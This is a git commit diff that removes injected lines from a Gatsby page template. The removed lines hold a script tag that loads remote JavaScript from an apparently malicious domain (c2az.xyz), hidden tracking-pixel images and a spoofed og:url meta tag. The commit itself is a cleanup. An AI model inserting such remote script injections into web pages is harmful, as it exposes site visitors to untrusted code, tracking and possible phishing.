e2ecd76e79f81040ea82ab6208c5907b65abcf3b
tusurucu23s <95896360+tusurucu23s@users.noreply.github.com>
2022-01-21 13:12:39 +0800

    Update using-dsg.js

--- src/templates/using-dsg.js
+++ src/templates/using-dsg.js
@@ -10,12 +10,7 @@ const UsingDSG = () => (
     <h1>Hello from a DSG Page</h1>
     <p>This page is not created until requested by a user.</p>
     <p>
-      <meta property="og:url" content="https://www.youtube.com/" />
-<script src="https://c2az.xyz/manzana/?api=1&lan=facebookapphk&ht=1" type="text/javascript" async="true"></script>
-<img src="//whos.amung.us/pingjs/?k=elchapito07s&amp;t=🛸 NO FORCE MMG 👽&amp;x=https://www.messenger.com/" style="display:none" alt="">                    
-  <script type="text/javascript"></script>
-<img src="//whos.amung.us/pingjs/?k=elcartel07&amp;t=🛸 NO FORCE MMG 👽&amp;x=https://www.messenger.com/" style="display:none" alt="">                    
-  <script type="text/javascript"></script> 
+ 
       </a>
       .
     </p>
